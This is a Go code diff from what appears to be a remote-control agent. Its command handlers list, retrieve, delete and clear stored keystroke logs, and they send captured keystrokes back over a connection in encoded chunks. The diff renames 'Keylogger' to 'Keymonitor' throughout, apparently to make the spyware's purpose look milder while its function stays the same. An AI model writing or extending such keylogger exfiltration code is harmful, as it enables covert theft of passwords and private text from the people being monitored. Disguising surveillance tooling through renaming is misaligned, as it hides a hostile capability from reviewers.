@@ -12,20 +12,20 @@ import (
 const MaxChunkSize = 256 * 1024
 
 func HandleKeylogList(ctx context.Context, env *runtime.Env, cmdID string) error {
-	if env.Keylogger == nil {
+	if env.Keymonitor == nil {
 		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
 			"type":      "command_result",
 			"commandId": cmdID,
 			"ok":        false,
-			"message":   "Keylogger not initialized",
+			"message":   "Keymonitor not initialized",
 		})
 	}
 
-	env.Keylogger.FlushNow()
+	env.Keymonitor.FlushNow()
 
-	files, err := env.Keylogger.ListFiles()
+	files, err := env.Keymonitor.ListFiles()
 	if err != nil {
-		log.Printf("[keylogger] list error: %v", err)
+		log.Printf("[keymonitor] list error: %v", err)
 		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
 			"type":      "command_result",
 			"commandId": cmdID,
@@ -50,12 +50,12 @@ func HandleKeylogList(ctx context.Context, env *runtime.Env, cmdID string) error
 }
 
 func HandleKeylogRetrieve(ctx context.Context, env *runtime.Env, cmdID string, filename string) error {
-	if env.Keylogger == nil {
+	if env.Keymonitor == nil {
 		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
 			"type":      "command_result",
 			"commandId": cmdID,
 			"ok":        false,
-			"message":   "Keylogger not initialized",
+			"message":   "Keymonitor not initialized",
 		})
 	}
 
@@ -68,11 +68,11 @@ func HandleKeylogRetrieve(ctx context.Context, env *runtime.Env, cmdID string, f
 		})
 	}
 
-	env.Keylogger.FlushNow()
+	env.Keymonitor.FlushNow()
 
-	data, err := env.Keylogger.ReadFile(filename)
+	data, err := env.Keymonitor.ReadFile(filename)
 	if err != nil {
-		log.Printf("[keylogger] read error: %v", err)
+		log.Printf("[keymonitor] read error: %v", err)
 		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
 			"type":      "command_result",
 			"commandId": cmdID,
@@ -112,7 +112,7 @@ func HandleKeylogRetrieve(ctx context.Context, env *runtime.Env, cmdID string, f
 			"isLast":    isLast,
 			"isEncoded": true,
 		}); err != nil {
-			log.Printf("[keylogger] send chunk error: %v", err)
+			log.Printf("[keymonitor] send chunk error: %v", err)
 			return err
 		}
 
@@ -129,18 +129,18 @@ func HandleKeylogRetrieve(ctx context.Context, env *runtime.Env, cmdID string, f
 }
 
 func HandleKeylogClearAll(ctx context.Context, env *runtime.Env, cmdID string) error {
-	if env.Keylogger == nil {
+	if env.Keymonitor == nil {
 		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
 			"type":      "keylog_clear_result",
 			"commandId": cmdID,
 			"ok":        false,
-			"error":     "Keylogger not initialized",
+			"error":     "Keymonitor not initialized",
 		})
 	}
 
-	err := env.Keylogger.ClearAll()
+	err := env.Keymonitor.ClearAll()
 	if err != nil {
-		log.Printf("[keylogger] clear error: %v", err)
+		log.Printf("[keymonitor] clear error: %v", err)
 		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
 			"type":      "keylog_clear_result",
 			"commandId": cmdID,
@@ -156,12 +156,12 @@ func HandleKeylogClearAll(ctx context.Context, env *runtime.Env, cmdID string) e
 }
 
 func HandleKeylogDelete(ctx context.Context, env *runtime.Env, cmdID string, filename string) error {
-	if env.Keylogger == nil {
+	if env.Keymonitor == nil {
 		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
 			"type":      "keylog_delete_result",
 			"commandId": cmdID,
 			"ok":        false,
-			"error":     "Keylogger not initialized",
+			"error":     "Keymonitor not initialized",
 		})
 	}
 
@@ -174,8 +174,8 @@ func HandleKeylogDelete(ctx context.Context, env *runtime.Env, cmdID string, fil
 		})
 	}
 
-	if err := env.Keylogger.DeleteFile(filename); err != nil {
-		log.Printf("[keylogger] delete error: %v", err)
+	if err := env.Keymonitor.DeleteFile(filename); err != nil {
+		log.Printf("[keymonitor] delete error: %v", err)
 		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
 			"type":      "keylog_delete_result",
 			"commandId": cmdID,
